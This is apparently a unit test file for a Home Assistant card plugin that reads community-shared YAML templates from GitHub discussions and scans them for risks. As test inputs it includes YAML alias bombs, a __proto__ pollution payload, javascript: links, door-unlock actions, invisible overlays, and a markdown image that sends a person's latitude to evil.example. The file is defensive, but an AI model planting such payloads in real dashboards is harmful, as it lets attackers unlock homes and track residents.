/*
 * Unit tests for src/community.ts - reading templates out of GitHub discussion posts,
 * and fetching and caching the list of them. Run with `npm test`.
 */
const {
  extractYaml,
  parseDiscussion,
  parseDiscussions,
  communityNeeds,
  postBody,
  fetchCommunity,
  communityRisks,
  COMMUNITY_CATEGORY,
} = require('../.test-build/community.js');

const { check, report } = require('./harness');

const category = { slug: COMMUNITY_CATEGORY, name: 'Share your templates' };

function post(number, body, extra = {}) {
  return {
    number,
    title: `Post ${number}`,
    body,
    html_url: `https://github.com/x/y/discussions/${number}`,
    user: { login: 'someone' },
    category,
    reactions: { total_count: 0 },
    updated_at: '2026-10-01T00:00:00Z',
    ...extra,
  };
}

const TILE = 'template: tile_light\nvariables:\n  - entity\ncard:\n  type: tile\n  entity: "[[entity]]"\n';

/* --- extractYaml --- */

check('a yaml block is found', extractYaml('Some words\n\n```yaml\na: 1\n```\n'), 'a: 1\n');
check('yml counts as yaml', extractYaml('```yml\na: 1\n```'), 'a: 1\n');
check(
  'a yaml block wins over an earlier unmarked one',
  extractYaml('```\nnot this\n```\n\n```yaml\nthis: 1\n```'),
  'this: 1\n',
);
check('an unmarked block is used when nothing is marked', extractYaml('```\na: 1\n```'), 'a: 1\n');
check('a block in another language is not', extractYaml('```js\nalert(1)\n```'), undefined);
check('tilde fences work too', extractYaml('~~~yaml\na: 1\n~~~'), 'a: 1\n');
check('no block, no yaml', extractYaml('just prose'), undefined);
check('a missing body is nothing', extractYaml(undefined), undefined);

/* --- parseDiscussion --- */

const entry = parseDiscussion(post(7, `A tile for a light.\n\n\`\`\`yaml\n${TILE}\`\`\`\n`));
check('a post becomes an entry named after its template', entry && entry.name, 'tile_light');
check('the template is kept without its name or type', entry && entry.template, {
  variables: ['entity'],
  card: { type: 'tile', entity: '[[entity]]' },
});
check('the post is linked', entry && entry.url, 'https://github.com/x/y/discussions/7');
check('the poster is credited', entry && entry.author, 'someone');

check(
  'an exported type tag is dropped, the installing card sets its own',
  parseDiscussion(post(1, '```yaml\ntype: custom:decluttering-template-plus\n' + TILE + '```')).template.type,
  undefined,
);

check(
  'carried templates are kept apart from the template',
  parseDiscussion(
    post(
      1,
      '```yaml\ntemplate: outer\ncard:\n  type: custom:decluttering-card-plus\n  template: inner\nincludes:\n  inner:\n    card:\n      type: tile\n```',
    ),
  ).includes,
  { inner: { card: { type: 'tile' } } },
);

check('a post that is not yaml is left out', parseDiscussion(post(1, '```yaml\na: [\n```')), undefined);
check('a post that is not a template is left out', parseDiscussion(post(1, '```yaml\nfoo: bar\n```')), undefined);
check(
  'a template defining two things is left out',
  parseDiscussion(post(1, '```yaml\ntemplate: x\ncard: {type: tile}\nrow: {type: x}\n```')),
  undefined,
);
check(
  'yaml tags beyond plain data do not survive',
  parseDiscussion(post(1, '```yaml\ntemplate: x\ncard: !!js/function "() => 1"\n```')),
  undefined,
);
check(
  'a __proto__ key does not reach the prototype',
  (() => {
    const parsed = parseDiscussion(
      post(1, '```yaml\ntemplate: x\ncard:\n  type: tile\n__proto__:\n  polluted: yes\n```'),
    );
    return [{}.polluted, parsed && Object.getPrototypeOf(parsed.template) === Object.prototype];
  })(),
  [undefined, true],
);
check(
  'a post without a title takes the template name',
  parseDiscussion(post(1, '```yaml\n' + TILE + '```', { title: '  ' })).title,
  'tile_light',
);

/* --- parseDiscussions --- */

check(
  'only the shared-templates category is read',
  parseDiscussions([
    post(1, '```yaml\n' + TILE + '```'),
    post(2, '```yaml\n' + TILE + '```', { category: { slug: 'q-a' } }),
  ]).map((each) => each.id),
  [1],
);

check(
  'better received first, then newer',
  parseDiscussions([
    post(1, '```yaml\n' + TILE + '```', { updated_at: '2026-01-01T00:00:00Z' }),
    post(2, '```yaml\n' + TILE + '```', { updated_at: '2026-05-01T00:00:00Z' }),
    post(3, '```yaml\n' + TILE + '```', { reactions: { total_count: 4 } }),
  ]).map((each) => each.id),
  [3, 2, 1],
);

/* --- communityNeeds --- */

const nested = parseDiscussion(
  post(
    1,
    '```yaml\ntemplate: outer\ncard:\n  type: vertical-stack\n  cards:\n    - type: custom:decluttering-card-plus\n      template: inner\n    - type: custom:decluttering-card-plus\n      template: elsewhere\n    - type: custom:mushroom-template-card\nincludes:\n  inner:\n    card:\n      type: custom:button-card\n```',
  ),
);
check('custom cards are gathered from the template and what it carries', communityNeeds(nested, []).customTypes, [
  'custom:button-card',
  'custom:mushroom-template-card',
]);
check('a template it calls but does not carry is needed', communityNeeds(nested, []).templates, ['elsewhere']);
check('unless it is already here', communityNeeds(nested, ['elsewhere']).templates, []);

/* --- postBody --- */

check(
  'a post is the description, the notes, then the yaml in a block',
  postBody('template: x\ncard:\n  type: tile\n', ['Needs custom:button-card'], 'A tile.'),
  'A tile.\n\nNeeds custom:button-card\n\n```yaml\ntemplate: x\ncard:\n  type: tile\n```\n',
);
check(
  'a post can be read back as the template it came from',
  parseDiscussion(post(1, postBody('template: x\ncard:\n  type: tile\n', [], 'A tile.'))).name,
  'x',
);

/* --- what a post cannot do to the people who load the list --- */

// Ten of the level below, seven levels deep: a few hundred bytes that expand to hundreds of
// megabytes if every alias is followed.
function bomb(depth) {
  let yaml = 'a0: &a0 [x,x,x,x,x,x,x,x,x,x]\n';
  for (let i = 1; i <= depth; i += 1)
    yaml +=
      `a${i}: &a${i} [` +
      Array(10)
        .fill(`*a${i - 1}`)
        .join(',') +
      ']\n';
  return yaml + 'template: t\ncard: {type: markdown}\n';
}
const bombAt = Date.now();
check(
  'a post whose yaml balloons when its aliases are followed is left out',
  parseDiscussion(post(900, '```yaml\n' + bomb(6) + '```')),
  undefined,
);
check('and is left out quickly', Date.now() - bombAt < 1500, true);

// One long string, aliased ten times into a list, that list ten times into another, and so
// on: under thirty kilobytes of post that would be hundreds of megabytes once copied.
function longAliasBomb() {
  const lines = [`s: &s "${'x'.repeat(25000)}"`];
  let last = 's';
  for (let i = 1; i <= 3; i += 1) {
    lines.push(`l${i}: &l${i} [${Array(10).fill(`*${last}`).join(',')}]`);
    last = `l${i}`;
  }
  lines.push(`l4: [${Array(15).fill(`*${last}`).join(',')}]`);
  return lines.join('\n') + '\ntemplate: t\ncard: {type: markdown}\n';
}
const longBombAt = Date.now();
check(
  'a post whose aliases share one long string is left out',
  parseDiscussion(post(907, '```yaml\n' + longAliasBomb() + '```')),
  undefined,
);
check('and quickly', Date.now() - longBombAt < 500, true);
check(
  'a template that aliases a few of its own pieces still loads',
  parseDiscussion(
    post(
      908,
      '```yaml\ntemplate: t\ncard:\n  type: tile\n  tap_action: &a {action: more-info}\n  hold_action: *a\n  double_tap_action: *a\n  icon_tap_action: *a\n```',
    ),
  ).template.card.hold_action,
  { action: 'more-info' },
);
check(
  'a post with more aliases than a template has pieces to share is left out',
  parseDiscussion(
    post(
      909,
      '```yaml\na: &a 1\nb: [' + Array(100).fill('*a').join(',') + ']\ntemplate: t\ncard: {type: markdown}\n```',
    ),
  ),
  undefined,
);

check(
  'a post longer than any template is left out before it is read',
  parseDiscussion(post(901, '```yaml\n' + TILE + '```\n' + '-'.repeat(70000))),
  undefined,
);

const fenceAt = Date.now();
check('a fence that never closes finds no yaml', extractYaml('```x\n'.repeat(13000)), undefined);
check('and does not take seconds to say so', Date.now() - fenceAt < 500, true);

check(
  'includes that are not templates are dropped',
  parseDiscussion(
    post(
      902,
      '```yaml\n' +
        TILE +
        'includes:\n  good:\n    card: {type: tile}\n  text: hello\n  bare:\n    description: x\n```',
    ),
  ).includes,
  { good: { card: { type: 'tile' } } },
);

check(
  'a description that is not text is dropped',
  parseDiscussion(post(903, '```yaml\n' + TILE + 'description:\n  _$litType$: 1\n```')).template.description,
  undefined,
);

check(
  'a link that does not go to GitHub is replaced by the one that does',
  parseDiscussion(post(904, '```yaml\n' + TILE + '```', { html_url: 'javascript:alert(1)' })).url,
  'https://github.com/tempus2016/decluttering-card-plus/discussions/904',
);

const risky = parseDiscussion(
  post(
    905,
    [
      '```yaml',
      'template: r',
      'card:',
      '  type: vertical-stack',
      '  cards:',
      '    - type: tile',
      '      entity: lock.front',
      '      tap_action: {action: perform-action, perform_action: lock.unlock}',
      '      hold_action: {action: call-service, service: homeassistant.restart}',
      '    - type: iframe',
      '      url: https://evil.example/',
      '    - type: custom:button-card',
      '      name: "[[[ return 1 ]]]"',
      '    - type: markdown',
      '      content: "![](https://evil.example/c?d={{ states.person.x.attributes.latitude }})"',
      '```',
    ].join('\n'),
  ),
);
check('what a post would do once installed is spelt out', communityRisks(risky), {
  actions: ['homeassistant.restart', 'lock.unlock'],
  urls: ['https://evil.example/', 'https://evil.example/c?d='],
  embeds: true,
  scripts: true,
  placeholders: false,
  overlay: false,
});
const nothing = { actions: [], urls: [], embeds: false, scripts: false, placeholders: false, overlay: false };
check(
  'a harmless post has nothing to say',
  communityRisks(parseDiscussion(post(906, '```yaml\n' + TILE + '```'))),
  nothing,
);

// The risks of a template posted as the given YAML lines (the name and `card:` supplied).
function risksOf(lines, name = 'r') {
  return communityRisks(parseDiscussion(post(910, ['```yaml', `template: ${name}`, ...lines, '```'].join('\n'))));
}

/* --- what a post can hide from the scan --- */

check(
  "an action spelt by a variable is read with the template's own default in place",
  risksOf([
    'default: [{a: perform-action}]',
    'card:',
    '  type: tile',
    '  entity: light.x',
    '  tap_action: {action: "[[a]]", perform_action: lock.unlock}',
  ]),
  { actions: ['lock.unlock'], urls: [], embeds: false, scripts: false, placeholders: true, overlay: false },
);
check(
  "and with a declared variable's default too",
  risksOf([
    'variables: [{name: svc, default: lock.unlock}]',
    'card:',
    '  type: tile',
    '  entity: light.x',
    '  tap_action: {action: perform-action, perform_action: "[[svc]]"}',
  ]).actions,
  ['lock.unlock'],
);
check(
  'a placeholder as a mapping key is a risk in itself',
  risksOf(['card:', '  type: tile', '  entity: light.x', '  tap_action: {"[[k]]": perform-action}']).placeholders,
  true,
);
check(
  'a card type spelt by a variable is read with its default, and flagged for being a variable',
  (() => {
    const risks = risksOf(['default: [{t: iframe}]', 'card:', '  type: "[[t]]"', '  url: /local/x.html']);
    return [risks.embeds, risks.placeholders];
  })(),
  [true, true],
);
check(
  'a placeholder in a service name is a risk in itself',
  risksOf(['card:', '  type: tile', '  tap_action: {action: perform-action, perform_action: "[[svc]]"}']).placeholders,
  true,
);
check(
  'a placeholder anywhere else is the ordinary way to write a template',
  risksOf(['variables: [entity, name]', 'card:', '  type: tile', '  entity: "[[entity]]"', '  name: "[[name]]"']),
  nothing,
);

check(
  'a toggle on a lock, a cover, an alarm, a script or a button is spelt out',
  risksOf([
    'card:',
    '  type: vertical-stack',
    '  cards:',
    '    - {type: tile, entity: lock.front, tap_action: {action: toggle}}',
    '    - {type: tile, entity: cover.garage, hold_action: {action: toggle}}',
    '    - {type: tile, entity: alarm_control_panel.home, double_tap_action: {action: toggle}}',
    '    - {type: button, entity: script.open_all, tap_action: {action: toggle}}',
    '    - {type: button, entity: input_button.panic, tap_action: {action: toggle}}',
  ]).actions,
  [
    'toggle alarm_control_panel.home',
    'toggle cover.garage',
    'toggle input_button.panic',
    'toggle lock.front',
    'toggle script.open_all',
  ],
);
check(
  'a toggle on a light, a switch, a fan or a boolean is what a tile is for',
  risksOf([
    'card:',
    '  type: vertical-stack',
    '  cards:',
    '    - {type: tile, entity: light.x, tap_action: {action: toggle}}',
    '    - {type: tile, entity: switch.x, tap_action: {action: toggle}}',
    '    - {type: tile, entity: fan.x, hold_action: {action: toggle}}',
    '    - {type: tile, entity: input_boolean.x, tap_action: {action: toggle}}',
  ]),
  nothing,
);
check(
  'more-info and navigate on a lock are fine',
  risksOf([
    'card:',
    '  type: tile',
    '  entity: lock.front',
    '  tap_action: {action: more-info}',
    '  hold_action: {action: navigate, navigation_path: /lovelace/locks}',
  ]),
  nothing,
);
check(
  'a toggle aimed at a lock through its target is seen too',
  risksOf(['card:', '  type: button', '  tap_action: {action: toggle, target: {entity_id: lock.front}}']).actions,
  ['toggle lock.front'],
);
check(
  'a DOM event and a url action are spelt out',
  risksOf([
    'card:',
    '  type: button',
    '  entity: light.x',
    '  tap_action: {action: fire-dom-event, browser_mod: {service: lock.unlock}}',
    '  hold_action: {action: url, url_path: "javascript:alert(1)"}',
  ]),
  {
    actions: ['fire-dom-event'],
    urls: ['javascript:alert(1)'],
    embeds: false,
    scripts: true,
    placeholders: false,
    overlay: false,
  },
);

check(
  'an address without a scheme, or shouted, is still an address',
  risksOf(['card:', '  type: markdown', '  content: "![](//evil.example/c?d=1) and HTTPS://EVIL.EXAMPLE/"']).urls,
  ['//evil.example/c?d=1', 'HTTPS://EVIL.EXAMPLE/'],
);
check(
  'a style that fetches something is an address too',
  risksOf([
    'card:',
    '  type: custom:button-card',
    '  styles: {card: ["background: url(\'//evil.example/p.png\')", "@import \'https://evil.example/s.css\'"]}',
  ]).urls,
  ['//evil.example/p.png', 'https://evil.example/s.css'],
);
check(
  'a style drawing on a local image is not',
  risksOf(['card:', '  type: custom:button-card', '  styles: {card: ["background: url(/local/p.png)"]}']).urls,
  [],
);
check(
  'a config-template-card expression is script',
  risksOf([
    'card:',
    '  type: custom:config-template-card',
    '  entities: [light.x]',
    '  card: {type: tile, entity: "${states[\'light.x\'].entity_id}"}',
  ]).scripts,
  true,
);

/* --- what the scan missed until review 2026-10-25 --- */

check(
  'a repeat over the registry that reaches locks, pressed through a placeholder, is spelt out',
  risksOf(
    [
      'card: {type: custom:decluttering-card-plus, template: light_tile, for_each_from: {domain: lock}}',
      'includes:',
      '  light_tile: {card: {type: button, name: Lights, entity: "[[entity]]", tap_action: {action: toggle}}}',
    ],
    'room_lights',
  ).actions,
  ['toggle lock.*'],
);
check(
  'a repeat over every entity reaches everything',
  risksOf(
    [
      'card: {type: custom:decluttering-card-plus, template: t, for_each_from: {entities: true}}',
      'includes:',
      '  t: {card: {type: tile, entity: "[[entity]]", tap_action: {action: toggle}}}',
    ],
    'r',
  ).actions,
  ['toggle *'],
);
check(
  'a repeat over lights pressed through a placeholder is what a repeat is for',
  risksOf(
    [
      'card: {type: custom:decluttering-card-plus, template: t, for_each_from: {entities: "light.*"}}',
      'includes:',
      '  t: {card: {type: tile, entity: "[[entity]]", tap_action: {action: toggle}}}',
    ],
    'r',
  ).actions,
  [],
);
check(
  'a lock passed to a template as a variable is seen inside that template',
  risksOf(
    [
      'card: {type: custom:decluttering-card-plus, template: t, variables: [{entity: lock.front}]}',
      'includes:',
      '  t: {card: {type: tile, entity: "[[entity]]", tap_action: {action: toggle}}}',
    ],
    'r',
  ).actions,
  ['toggle lock.front'],
);
check(
  "and so is one passed to the post's own template by a card inside it",
  risksOf(
    [
      'card:',
      '  type: vertical-stack',
      '  cards:',
      '    - {type: custom:decluttering-card-plus, template: r, variables: {entity: lock.front}}',
      '    - {type: tile, entity: "[[entity]]", tap_action: {action: toggle}}',
    ],
    'r',
  ).actions,
  ['toggle lock.front'],
);
check(
  'two templates that call each other with variables are each read once, not until the stack runs out',
  risksOf(
    [
      'card: {type: custom:decluttering-card-plus, template: t, variables: {entity: lock.front}}',
      'includes:',
      '  t:',
      '    card:',
      '      type: vertical-stack',
      '      cards:',
      '        - {type: custom:decluttering-card-plus, template: r, variables: {entity: lock.back}}',
      '        - {type: tile, entity: "[[entity]]", tap_action: {action: toggle}}',
    ],
    'r',
  ).actions,
  ['toggle lock.front'],
);
check(
  'an auto-entities filter on locks with a toggle in its options is spelt out',
  risksOf([
    'card:',
    '  type: custom:auto-entities',
    '  card: {type: entities}',
    '  filter: {include: [{domain: lock, options: {tap_action: {action: toggle}}}, {domain: light, options: {tap_action: {action: toggle}}}]}',
  ]).actions,
  ['toggle lock.*'],
);
check(
  'a toggle on a valve, a siren, an automation or a water heater is spelt out too',
  risksOf([
    'card:',
    '  type: vertical-stack',
    '  cards:',
    '    - {type: tile, entity: valve.water_main, tap_action: {action: toggle}}',
    '    - {type: tile, entity: siren.alarm, tap_action: {action: toggle}}',
    '    - {type: tile, entity: automation.away, tap_action: {action: toggle}}',
    '    - {type: tile, entity: water_heater.tank, tap_action: {action: toggle}}',
  ]).actions,
  ['toggle automation.away', 'toggle siren.alarm', 'toggle valve.water_main', 'toggle water_heater.tank'],
);
check(
  'an address written with backslashes, or with its scheme but no slashes, is still an address',
  risksOf([
    'card:',
    '  type: vertical-stack',
    '  cards:',
    '    - {type: picture, image: "/\\\\evil.example/p.png?n=[[entity|friendly_name]]"}',
    '    - {type: picture, image: "https:evil.example/x"}',
    '    - {type: picture, image: "evil.example/y.png"}',
    '    - {type: markdown, content: "<img src=\\"\\\\\\\\evil.example\\\\q.gif\\">"}',
    '    - {type: custom:button-card, styles: {card: ["background: url(\'/\\\\evil.example/x\')", "background: image-set(\'//evil.example/z\' 1x)"]}}',
  ]).urls,
  [
    '//evil.example/p.png?n=[[entity|friendly_name',
    '//evil.example/q.gif',
    '//evil.example/x',
    '//evil.example/z',
    'evil.example/y.png',
    'https:evil.example/x',
  ],
);
check(
  "an icon, a local picture, a placeholder and this Home Assistant's own paths are not addresses",
  risksOf([
    'card:',
    '  type: vertical-stack',
    '  cards:',
    '    - {type: picture, image: /local/p.png, icon: mdi:lightbulb}',
    '    - {type: picture, image: "[[image]]"}',
    '    - {type: picture, image: "/api/camera_proxy/camera.x"}',
    '    - {type: picture, image: "data:image/png;base64,AAAA"}',
    '    - {type: tile, entity: light.x, name: "Kitchen 12:30"}',
  ]).urls,
  [],
);
check(
  'a style that lays the card invisibly over the screen is spelt out',
  risksOf([
    'card:',
    '  type: custom:button-card',
    '  tap_action: {action: toggle, target: {entity_id: lock.front}}',
    '  card_mod: {style: "ha-card { position: fixed; inset: 0; opacity: 0; }"}',
  ]).overlay,
  true,
);
check(
  'a code block hidden in an HTML comment is not the template; the one people see is',
  extractYaml(
    '<!--\n```yaml\ntemplate: hidden\ncard: {type: iframe, url: https://evil.example/}\n```\n-->\n```yaml\ntemplate: shown\ncard: {type: tile}\n```\n',
  ),
  'template: shown\ncard: {type: tile}\n',
);
check(
  'a code block indented four spaces shows as text on GitHub, so it is not the template',
  extractYaml('    ```yaml\n    a: 1\n    ```\n```yaml\nb: 2\n```\n'),
  'b: 2\n',
);
check(
  'a title padded with blank-looking characters is cut back, and a long one is cut short',
  (() => {
    const { cleanTitle } = require('../.test-build/community.js');
    return [
      cleanTitle('Room light tile by tempus2016' + '⠀'.repeat(40) + 'x'),
      cleanTitle('a'.repeat(100)).length,
      cleanTitle('⠀⠀'),
    ];
  })(),
  ['Room light tile by tempus2016x', 80, undefined],
);
check(
  'a post whose title is nothing but blanks is listed under its template name',
  parseDiscussion(post(911, '```yaml\n' + TILE + '```', { title: '⠀ ㅤ' })).title,
  'tile_light',
);

/* --- fetchCommunity --- */

function memoryStorage() {
  const data = {};
  return {
    getItem: (key) => (key in data ? data[key] : null),
    setItem: (key, value) => {
      data[key] = String(value);
    },
  };
}

function respond(status, body, headers = {}) {
  return {
    ok: status >= 200 && status < 300,
    status,
    headers: { get: (name) => headers[name.toLowerCase()] ?? null },
    json: async () => body,
  };
}

(async () => {
  const storage = memoryStorage();
  const urls = [];
  const page = (n) => Array.from({ length: n }, (_, i) => post(i + 1, '```yaml\n' + TILE + '```'));
  const pages = [page(100), page(3)];
  const fetcher = async (url) => {
    urls.push(url);
    return respond(200, pages.shift() ?? []);
  };

  const first = await fetchCommunity({ fetcher, storage, now: 1000 });
  check('every page is read until a short one', urls.length, 2);
  check('the posts are parsed', first.entries.length, 103);

  const again = await fetchCommunity({ fetcher: async () => respond(500, null), storage, now: 2000 });
  check('a fresh cache is used without asking GitHub', again.fetched, 1000);

  let error;
  try {
    await fetchCommunity({
      refresh: true,
      fetcher: async () => respond(403, {}, { 'x-ratelimit-remaining': '0', 'x-ratelimit-reset': '5000' }),
      storage,
      now: 3000,
    });
  } catch (err) {
    error = err;
  }
  check('a rate limit says when to try again', error && error.retryAt, 5000000);
  check('and still hands back the cached list', error && error.cached && error.cached.entries.length, 103);

  let offline;
  try {
    await fetchCommunity({
      fetcher: async () => {
        throw new TypeError('Failed to fetch');
      },
      storage: memoryStorage(),
    });
  } catch (err) {
    offline = err;
  }
  check(
    'a network failure is reported, with nothing cached to fall back on',
    [offline && offline.message, offline && offline.cached],
    ['Failed to fetch', undefined],
  );

  const stale = await fetchCommunity({
    fetcher: async () => respond(200, []),
    storage,
    now: 1000 + 7 * 3600 * 1000,
  });
  check('a stale cache is refreshed', stale.entries.length, 0);

  const poisoned = memoryStorage();
  poisoned.setItem(
    'decluttering-card-plus-community',
    JSON.stringify({
      fetched: 1000,
      entries: [
        {
          id: 1,
          title: 't',
          author: 'a',
          url: 'javascript:alert(1)',
          name: 'ok',
          template: { card: { type: 'tile' } },
          includes: {},
          reactions: 0,
          updated: '',
        },
        { id: 'x', name: 5 },
        {
          id: 2,
          name: 'proto',
          template: { card: { type: 'tile', __proto__: { polluted: true } } },
          includes: {},
        },
        { id: 3, name: 'huge', template: { card: { type: 'tile', pad: 'x'.repeat(400000) } } },
        { id: 4, name: 'nothing', template: { description: 'defines no card' } },
      ],
    }),
  );
  const readBack = await fetchCommunity({ fetcher: async () => respond(500, null), storage: poisoned, now: 2000 });
  check(
    'a cached list is read back as carefully as a fetched one',
    readBack.entries.map((each) => [each.id, each.url]),
    [
      [1, 'https://github.com/tempus2016/decluttering-card-plus/discussions/1'],
      [2, 'https://github.com/tempus2016/decluttering-card-plus/discussions/2'],
    ],
  );
  check(
    'and a __proto__ key in it is a key no longer, while an oversized or empty entry is dropped',
    [Object.prototype.hasOwnProperty.call(readBack.entries[1].template.card, '__proto__'), {}.polluted],
    [false, undefined],
  );

  /* ------------------------------------------------------------- updates for installed templates */

  {
    const { communitySource, stampedTemplate, sharedUpdates } = require('../.test-build/community.js');

    const post = {
      id: 7,
      title: 'Tile',
      author: 'someone',
      url: 'https://github.com/x',
      name: 'tile_light',
      template: { card: { type: 'tile', v: 2 } },
      includes: { helper: { card: { type: 'markdown' } } },
      reactions: 0,
      updated: '2026-03-01T10:00:00Z',
    };
    const list = { entries: [post], fetched: 0 };

    check(
      'a post stamps what it installs with itself, when it was edited, the name in the post, and who posted it',
      communitySource(post, 'helper'),
      {
        discussion: 7,
        updated: '2026-03-01T10:00:00Z',
        name: 'helper',
        author: 'someone',
      },
    );

    check(
      'a stamp replaces whatever source the post was written with',
      stampedTemplate({ card: {}, source: { discussion: 1 } }, { discussion: 7 }),
      { card: {}, source: { discussion: 7 } },
    );

    const by = 'someone';
    const updates = sharedUpdates(
      [
        {
          name: 'tile_light',
          source: { discussion: 7, updated: '2026-01-01T00:00:00Z', name: 'tile_light', author: by },
        },
        {
          name: 'tile_light_2',
          source: { discussion: 7, updated: '2026-03-01T10:00:00Z', name: 'tile_light', author: by },
        },
        { name: 'helper', source: { discussion: 7, updated: '2026-01-01T00:00:00Z', name: 'helper', author: by } },
        {
          name: 'dropped',
          source: { discussion: 7, updated: '2026-01-01T00:00:00Z', name: 'not_any_more', author: by },
        },
        { name: 'deleted', source: { discussion: 99, updated: '2026-01-01T00:00:00Z', author: by } },
        { name: 'unstamped_time', source: { discussion: 7, author: by } },
      ],
      list,
    );

    check(
      'a post edited since the install is an update; one not edited is current; one gone says so',
      updates.map((each) => [each.name, each.status]),
      [
        ['tile_light', 'update'],
        ['tile_light_2', 'current'],
        ['helper', 'update'],
        ['dropped', 'gone'],
        ['deleted', 'gone'],
        ['unstamped_time', 'update'],
      ],
    );

    check('an update carries the template as the post has it now, stamped afresh', updates[0].latest, {
      card: { type: 'tile', v: 2 },
      source: { discussion: 7, updated: '2026-03-01T10:00:00Z', name: 'tile_light', author: 'someone' },
    });

    check('a template the post carries is found by its name in the post', updates[2].latest.card, { type: 'markdown' });

    check('an update carries who posted it, for the next check', updates[0].latest.source.author, 'someone');

    /*
     * The stamp names a post and who posted it. A stamp that was typed or pasted rather than
     * written by an install - no author, or the wrong one - cannot be trusted to point at the
     * template it says, and the post's edit time says nothing about that.
     */
    const doubted = sharedUpdates(
      [
        {
          name: 'other_account',
          source: { discussion: 7, updated: '2026-01-01T00:00:00Z', name: 'tile_light', author: 'else' },
        },
        { name: 'no_author', source: { discussion: 7, updated: '2026-01-01T00:00:00Z', name: 'tile_light' } },
        {
          name: 'blank_author',
          source: { discussion: 7, updated: '2026-01-01T00:00:00Z', name: 'tile_light', author: '' },
        },
        {
          name: 'wrong_author_but_current',
          source: { discussion: 7, updated: '2026-03-01T10:00:00Z', author: 'else' },
        },
      ],
      list,
    );

    check(
      'a post by anybody but the stamped author is never an update, however it is dated',
      doubted.map((each) => [each.name, each.status, 'latest' in each]),
      [
        ['other_account', 'unverified', false],
        ['no_author', 'unverified', false],
        ['blank_author', 'unverified', false],
        ['wrong_author_but_current', 'unverified', false],
      ],
    );

    check(
      'but the post is still named, so the person can go and look',
      doubted.map((each) => each.entry && each.entry.id),
      [7, 7, 7, 7],
    );

    check(
      'a post that is gone is gone before it is doubted',
      sharedUpdates([{ name: 'x', source: { discussion: 99, author: 'else' } }], list)[0].status,
      'gone',
    );

    check(
      'a post no longer listed has nothing to offer',
      [updates[4].entry, updates[4].latest],
      [undefined, undefined],
    );
  }

  report();
})();
